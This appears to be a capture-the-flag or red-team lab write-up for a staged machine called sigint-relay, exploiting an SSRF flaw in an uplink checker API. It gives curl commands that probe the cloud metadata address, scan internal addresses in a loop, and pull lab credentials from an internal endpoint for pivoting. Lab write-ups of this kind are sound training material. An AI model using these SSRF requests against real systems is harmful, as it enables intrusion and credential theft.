# Red Team — M1: sigint-relay

**Vulnerability:** SSRF in Satellite Uplink Checker
**Technique:** T1090.002 — Proxy: Internal Proxy (SSRF)
**Entry:** HTTP port 80 via floating IP

---

## Step 1 — Recon
<img width="1063" height="794" alt="image" src="https://github.com/user-attachments/assets/ea7834d4-cb74-47f5-96a8-1b2bd46c3a19" />

<img width="1468" height="869" alt="image" src="https://github.com/user-attachments/assets/ac3bc94b-e625-4556-b94a-4e982b6f284b" />

<img width="1470" height="776" alt="image" src="https://github.com/user-attachments/assets/5a6e79a0-6fd1-4690-ad0a-5b1f557a69ac" />


```bash
curl -s http://<M1-FLOAT-IP>/ | grep -i "uplink\|api\|check"
# Navigate to UPLINK CHECKER panel in the dashboard
```
<img width="1467" height="624" alt="image" src="https://github.com/user-attachments/assets/3277811b-0b64-4506-a106-8d96b747d99b" />


---

## Step 2 — Confirm SSRF

Test with a non-existent internal host to confirm server-side requests:
```bash
curl -s -X POST http://<M1-IP>/api/uplink/check \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://10.0.0.1:9999/test"}'
# Returns connection error — server is making the request, not the browser
```
<img width="1463" height="265" alt="image" src="https://github.com/user-attachments/assets/cec563e8-2897-49e8-b4d4-3779cc3d5c8d" />
<img width="1470" height="627" alt="image" src="https://github.com/user-attachments/assets/6c8cabb6-d14a-4189-a91e-18bac11c70f0" />

<img width="1468" height="752" alt="image" src="https://github.com/user-attachments/assets/dd411f20-98b5-4cd2-8e2b-7f60ee3c8ad0" />


The filter only blocks `localhost` and `127.0.0.1` — NOT RFC1918 DMZ ranges.

---

## Step 3 — Discover DMZ Network

```bash
# From M1 shell or SSRF-based scan — M1's own DMZ interface reveals the subnet
curl -s -X POST http://<M1-IP>/api/uplink/check \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://169.254.169.254/latest/meta-data/"}' | python3 -m json.tool

# Scan DMZ for port 8080 using SSRF:
# Try common DMZ addresses (iterate 11.0.0.1 to 11.0.0.254)
for i in $(seq 1 20); do
  curl -s -X POST http://<M1-IP>/api/uplink/check \
    -H "Content-Type: application/json" \
    -d "{\"target_url\":\"http://11.0.0.$i:8080/api/internal/status\"}" \
    | grep -l '"system"' && echo "FOUND at 11.0.0.$i" && break
done
```

---

## Step 4 — Hit M2's Internal Credential Endpoint

```bash
# Once M2's DMZ IP is known:
curl -s -X POST http://<M1-IP>/api/uplink/check \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://<M2-DMZ-IP>:8080/api/internal/status"}' \
  | python3 -m json.tool
```
<img width="1451" height="315" alt="image" src="https://github.com/user-attachments/assets/dd79dfc9-b8fd-4376-88e6-61229a7bed69" />

<img width="1016" height="425" alt="image" src="https://github.com/user-attachments/assets/a7c7171b-eed1-44ea-af14-3eedccc70242" />

<img width="1071" height="714" alt="image" src="https://github.com/user-attachments/assets/9bfe0cc9-898d-4e79-8274-c85edcec86f8" />


Response contains:
```json
{
  "response": {
    "service": "SIGINT Network Monitor",
    "bootstrap_credentials": {
      "username": "monitor_admin",
      "password": "S1GN4L#Mon!tor"
    }
  }
}
```

---

## Flag Location
`/opt/sigint/classified/flag1.txt` — accessible after shell via M2's command injection.

**Proceed to M2 with:** `monitor_admin : S1GN4L#Mon!tor`
